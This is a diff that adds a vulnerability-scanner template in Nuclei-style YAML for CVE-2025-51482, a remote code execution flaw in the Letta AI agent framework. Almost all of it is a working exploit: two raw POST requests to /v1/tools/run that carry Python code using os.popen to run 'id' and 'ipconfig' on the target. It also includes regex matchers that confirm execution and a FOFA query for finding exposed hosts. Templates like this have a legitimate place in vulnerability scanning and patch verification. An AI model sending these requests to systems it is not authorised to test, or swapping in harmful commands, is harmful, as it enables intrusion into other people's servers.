@@ -1,0 +1,63 @@
+id: letta-run-rce
+info:
+  name: Letta平台AI代理框架 rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/9ca070a79859f2137ff65d1328ed6c5a2238f11d/Letta/Letta%E5%B9%B3%E5%8F%B0(AI%E4%BB%A3%E7%90%86%E6%A1%86%E6%9E%B6)%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2025-51482.txt#L4
+  classification:
+    cve-id: CVE-2025-51482
+  metadata:
+    verified: true
+    fofa-query: app="letta" || title="letta"
+    tips:
+    repair:
+    version:
+  tags: rce,letta
+
+http:
+  - raw:
+      - |
+        POST /v1/tools/run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 248
+
+        {
+          "source_code": "def test():\n    \"\"\"Test rce.\"\"\"\n    import os\n    return os.popen('id').read()",
+          "args": {},
+          "env_vars": {
+            "PYTHONPATH": "/usr/lib/python3/dist-packages"
+          },
+          "name": "test"
+        }
+
+      - |
+        POST /v1/tools/run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 248
+
+        {
+          "source_code": "def test():\n    \"\"\"Test rce.\"\"\"\n    import os\n    return os.popen('ipconfig').read()",
+          "args": {},
+          "env_vars": {
+            "PYTHONPATH": "/usr/lib/python3/dist-packages"
+          },
+          "name": "test"
+        }
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
